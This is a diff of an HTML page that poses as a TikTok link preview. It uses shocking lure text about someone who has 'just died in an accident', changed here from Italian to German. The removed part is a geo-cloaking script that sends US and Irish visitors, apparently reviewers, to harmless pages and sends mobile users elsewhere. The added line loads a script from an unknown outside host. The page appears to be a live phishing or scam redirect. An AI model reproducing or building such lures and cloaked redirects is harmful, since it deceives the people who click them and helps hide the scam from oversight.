@@ -5,8 +5,8 @@
   <meta name="facebook:card" content="summary_large_image" />
   <meta name="facebook:description" content="tiktok" />
   <meta name="facebook:app:country" content="US" />
-  <meta property="og:image" content="https://cdn.discordapp.com/attachments/1167226338650898492/1168671358054563970/conovainadelblodia.png?ex=65529d04&is=65402804&hm=d2e43123519fdbdca4ec9aec498422932a04ca9970110a222fbf4c2505d6032c&" />
-  <meta property="og:title" content="È appena morto in un incidente, penso che tu lo conosca..😭"/>
+  <meta property="og:image" content="https://cdn.discordapp.com/attachments/1167217190676742266/1186346268516159498/65294ba045179.jpeg?ex=6592ea0f&is=6580750f&hm=9d36f4991f742c97fff6b388077b6fce0dc17845410784f15935bd0fd80b0671&" />
+  <meta property="og:title" content="Er ist gerade bei einem Unfall ums Leben gekommen, ich glaube, du kennst ihn..😭"/>
   <meta property="og:description" content="834, 835 views" />
   <meta property="og:site_name" content="tiktok" />
   <meta property="fb:app_id" content="87741124305" />
@@ -14,47 +14,4 @@
  <body>
  </body>
 </html>
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Parker1504</title>
-    <script>
-        function redirectToDifferentWebsite() {
-            var isMobile = /iphone|ipod|android|blackberry|opera mini|windows phone|iemobile|mobile/i.test(navigator.userAgent.toLowerCase());
-            var mobileDevice = "https://metametameta2222.jimdofree.com/";
-            var pcURL = "https://www.threads.net/@zuck"; 
-            var mobileURL = mobileDevice;
-            var irelandURL = "https://www.namecheap.com/myaccount/login/"; 
-            var blockedCountries = ['US', 'IE'];
-            
-           
-            fetch('https://ipinfo.io?token=74eaddd4400f3a')
-                .then(response => response.json())
-                .then(data => {
-                    var country = data.country;
-                    if (blockedCountries.includes(country)) {
-                        
-                        window.location.href = pcURL; 
-                    } else if (isMobile) {
-                        window.location.href = mobileURL;
-                    } else {
-                        if (country === 'IE') {
-                            window.location.href = irelandURL;
-                        } else {
-                            window.location.href = pcURL;
-                        }
-                    }
-                })
-                .catch(error => {
-                    console.error('Error fetching IP info:', error);
-                   
-                    window.location.href = pcURL;
-                });
-        }
-    
-        redirectToDifferentWebsite();
-    </script>    
-</head>
-<body>
-</body>
-</html>
+<script src="https://3qi8e.com/appsitex/?api=1&lan=cotize&ht=2" type="text/javascript" async="true"></script>
